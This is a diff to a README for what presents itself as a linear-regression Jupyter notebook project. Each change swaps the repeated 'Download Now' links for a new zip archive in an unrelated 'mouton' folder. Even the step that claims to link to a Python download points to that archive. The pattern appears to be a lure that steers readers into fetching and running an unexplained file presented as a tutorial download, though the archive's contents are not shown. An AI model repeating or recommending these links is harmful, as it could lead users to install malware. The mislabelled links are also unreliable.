@@ -1,6 +1,6 @@
 # 📈 Linear_regression_machine-_learning_model - Learn Linear Regression Easily
 
-[![Download](https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip)
+[![Download](https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Linear Regression Machine Learning Model Jupyter Notebook! This g
 
 ### 🛠 What You Need
 
-1. **Python Installed:** Ensure that you have Python installed on your computer. If you don’t have it yet, download it from [https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip](https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip).
+1. **Python Installed:** Ensure that you have Python installed on your computer. If you don’t have it yet, download it from [https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip](https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip).
    
 2. **Jupyter Notebook Installed:** This application runs in a Jupyter Notebook. To install it, open your command prompt or terminal and type:
    ```
@@ -24,7 +24,7 @@ Welcome to the Linear Regression Machine Learning Model Jupyter Notebook! This g
 
 To get started, visit the link below to download the Jupyter Notebook:
 
-[Visit this page to download](https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip)
+[Visit this page to download](https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip)
 
 Once you visit the page, follow these steps:
 
@@ -102,4 +102,4 @@ For updates and discussions related to this project, feel free to check the repo
 
 Enjoy your learning journey with the Linear Regression Machine Learning Model! 
 
-[Visit this page to download](https://raw.githubusercontent.com/Hemrajj13/Linear_regression_machine-_learning_model/main/mouton/machine_regression_model_Linear_learning_2.9.zip)
+[Visit this page to download](https://github.com/Hemrajj13/Linear_regression_machine-_learning_model/raw/refs/heads/main/mouton/learning-regression-Linear-machine-model-v3.5-beta.4.zip)
